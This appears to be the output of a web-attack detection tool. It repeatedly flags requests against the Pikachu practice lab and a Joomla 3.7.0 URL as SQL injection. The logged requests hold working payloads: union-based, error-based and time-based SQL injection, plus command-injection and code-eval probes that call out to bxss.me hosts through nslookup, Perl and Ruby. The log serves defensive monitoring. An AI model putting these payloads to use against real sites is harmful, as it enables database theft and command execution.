| sql注入 | [+]检测到威胁 192.168.227.1->192.168.227.135 /Joomla_3.7.0-Stable-Full_Package/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x5e,current_user(),0x5e),0)
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=`(nslookup%20hitkbjxshjbbi48900.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hitkbjxshjbbi48900.bxss.me')\x22)`&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=!(()%26%26!%7C*%7C*%7C&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=tUO2l7wo';%20waitfor%20delay%20'0:0:15'%20--%20&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22.gethostbyname(lc(\x22hitil\x22.\x22tmyyubkyc8c78.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(97).chr(69).chr(112).chr(78).\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=';print(md5(31337));%24a='&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name='%2B'A'.concat(70-3).concat(22*4).concat(99).concat(65).concat(102).concat(84)%2B(require'socket'%0ASocket.gethostbyname('hitgk'%2B'tjuofidn99c96.bxss.me.')[3].to_s)%2B'&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=;(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%7C(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%26(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=%5E(%23%24!%40%23%24)(()))******&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&'.gethostbyname(lc('hitmu'.'ggylodxzebf7e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(84).chr(110).chr(81).' HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22;print(md5(31337));%24a=\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22%2B\x22A\x22.concat(70-3).concat(22*4).concat(106).concat(70).concat(97).concat(72)%2B(require\x22socket\x22%0ASocket.gethostbyname(\x22hiter\x22%2B\x22jbvlevdf70a37.bxss.me.\x22)[3].to_s)%2B\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22.gethostbyname(lc(\x22hitiw\x22.\x22ysxydsko3e68e.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(115).chr(76).chr(99).chr(89).\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23'%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23%7C\x22%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=`(nslookup%20hitkbjxshjbbi48900.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hitkbjxshjbbi48900.bxss.me')\x22)`&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=!(()%26%26!%7C*%7C*%7C&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=tUO2l7wo';%20waitfor%20delay%20'0:0:15'%20--%20&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22.gethostbyname(lc(\x22hitil\x22.\x22tmyyubkyc8c78.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(97).chr(69).chr(112).chr(78).\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=';print(md5(31337));%24a='&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name='%2B'A'.concat(70-3).concat(22*4).concat(99).concat(65).concat(102).concat(84)%2B(require'socket'%0ASocket.gethostbyname('hitgk'%2B'tjuofidn99c96.bxss.me.')[3].to_s)%2B'&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=;(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%7C(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%26(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=%5E(%23%24!%40%23%24)(()))******&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&'.gethostbyname(lc('hitmu'.'ggylodxzebf7e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(84).chr(110).chr(81).' HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22;print(md5(31337));%24a=\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22%2B\x22A\x22.concat(70-3).concat(22*4).concat(106).concat(70).concat(97).concat(72)%2B(require\x22socket\x22%0ASocket.gethostbyname(\x22hiter\x22%2B\x22jbvlevdf70a37.bxss.me.\x22)[3].to_s)%2B\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22.gethostbyname(lc(\x22hitiw\x22.\x22ysxydsko3e68e.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(115).chr(76).chr(99).chr(89).\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23'%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23%7C\x22%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=`(nslookup%20hitkbjxshjbbi48900.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hitkbjxshjbbi48900.bxss.me')\x22)`&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=!(()%26%26!%7C*%7C*%7C&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=tUO2l7wo';%20waitfor%20delay%20'0:0:15'%20--%20&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22.gethostbyname(lc(\x22hitil\x22.\x22tmyyubkyc8c78.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(97).chr(69).chr(112).chr(78).\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=';print(md5(31337));%24a='&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name='%2B'A'.concat(70-3).concat(22*4).concat(99).concat(65).concat(102).concat(84)%2B(require'socket'%0ASocket.gethostbyname('hitgk'%2B'tjuofidn99c96.bxss.me.')[3].to_s)%2B'&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=;(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%7C(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%26(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=%5E(%23%24!%40%23%24)(()))******&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&'.gethostbyname(lc('hitmu'.'ggylodxzebf7e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(84).chr(110).chr(81).' HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22;print(md5(31337));%24a=\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22%2B\x22A\x22.concat(70-3).concat(22*4).concat(106).concat(70).concat(97).concat(72)%2B(require\x22socket\x22%0ASocket.gethostbyname(\x22hiter\x22%2B\x22jbvlevdf70a37.bxss.me.\x22)[3].to_s)%2B\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22.gethostbyname(lc(\x22hitiw\x22.\x22ysxydsko3e68e.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(115).chr(76).chr(99).chr(89).\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23'%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23%7C\x22%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=`(nslookup%20hitkbjxshjbbi48900.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hitkbjxshjbbi48900.bxss.me')\x22)`&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=!(()%26%26!%7C*%7C*%7C&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=tUO2l7wo';%20waitfor%20delay%20'0:0:15'%20--%20&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22.gethostbyname(lc(\x22hitil\x22.\x22tmyyubkyc8c78.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(97).chr(69).chr(112).chr(78).\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=';print(md5(31337));%24a='&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name='%2B'A'.concat(70-3).concat(22*4).concat(99).concat(65).concat(102).concat(84)%2B(require'socket'%0ASocket.gethostbyname('hitgk'%2B'tjuofidn99c96.bxss.me.')[3].to_s)%2B'&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=;(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%7C(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)%26(nslookup%20hittxfieaynfi38948.bxss.me%7C%7Cperl%20-e%20\x22gethostbyname('hittxfieaynfi38948.bxss.me')\x22)&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=%5E(%23%24!%40%23%24)(()))******&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:15 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&'.gethostbyname(lc('hitmu'.'ggylodxzebf7e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(84).chr(110).chr(81).' HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=\x22;print(md5(31337));%24a=\x22&submit=%E6%90%9C%E7%B4%A2 HTTP/1.1" 200 33779
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22%2B\x22A\x22.concat(70-3).concat(22*4).concat(106).concat(70).concat(97).concat(72)%2B(require\x22socket\x22%0ASocket.gethostbyname(\x22hiter\x22%2B\x22jbvlevdf70a37.bxss.me.\x22)[3].to_s)%2B\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&\x22.gethostbyname(lc(\x22hitiw\x22.\x22ysxydsko3e68e.bxss.me.\x22)).\x22A\x22.chr(67).chr(hex(\x2258\x22)).chr(115).chr(76).chr(99).chr(89).\x22 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [27/Dec/2021:14:12:16 "GET /pikachu/vul/sqli/sqli_search.php?name=mulOMpUR&echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23'%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23%7C\x22%20%26echo%20cfpdbf%24()%5C%20kgvtqh%5Cnz%5Exyu%7C%7Ca%20%23 HTTP/1.1" 200 33714
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
｜ sql注入 ｜[+]检测到威胁127.0.0.1 [26/Apr/2022:14:35:20 "GET /pikachu/vul/sqli/sqli_str.php?name=-1%27+union+select+1%2C2%2C3--%2B&submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1" 200 30965
